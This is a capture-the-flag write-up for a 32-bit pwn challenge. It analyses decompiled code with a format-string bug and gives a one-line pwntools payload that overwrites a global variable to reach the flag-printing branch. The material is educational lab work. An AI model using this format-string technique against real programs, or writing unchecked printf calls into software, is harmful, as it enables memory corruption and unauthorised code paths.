# Writeup for Global Warming (Pwn) Challenge`

### Info
```
[Put the description here]

File : global-warming: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a8349c997968a84bfa8b253e0f9a3f9349cc1538, for GNU/Linux 3.2.0, not stripped

Checksec : Arch:     i386-32-little
           RELRO:    Partial RELRO
           Stack:    No canary found
           NX:       NX enabled
           PIE:      No PIE (0x8048000)
```
### Analysis

The main takes 1024 bytes of stdin and calls login with our input.
```C
int main(int argc, const char **argv, const char **envp)
{
  char our_input; // [esp+0h] [ebp-408h]
  int *v5; // [esp+400h] [ebp-8h]

  v5 = &argc;
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  fgets(&our_input, 1024, stdin);
  login((int)"User", &our_input);
  return 0;
}
```

The function login() is called with our_input as a parameter.

```C
int login(int a1, char *our_input)
{
  int result; // eax

  printf(our_input);                            // Format string vulnerability
  if ( admin == 0xB4DBABE3 )
    result = system("cat flag.txt");
  else
    result = printf("You cannot login as admin.");
  return result;
}
```

### Exploit

![imgbb](https://i.ibb.co/Ypvp4zn/p1.jpg)
By this we get to know that our input is at the offset 12. We can build a format string payload with the help of pwntools.So we need to overwrite the `admin` variable with `0xB4DBABE3` we can do that by exploiting the format string bug.
`python payload = fmtstr_payload(12, {exe.symbols['admin'] : p64(0xB4DBABE3)}, write_size='short')`
 For complete solution look at exploit.py .
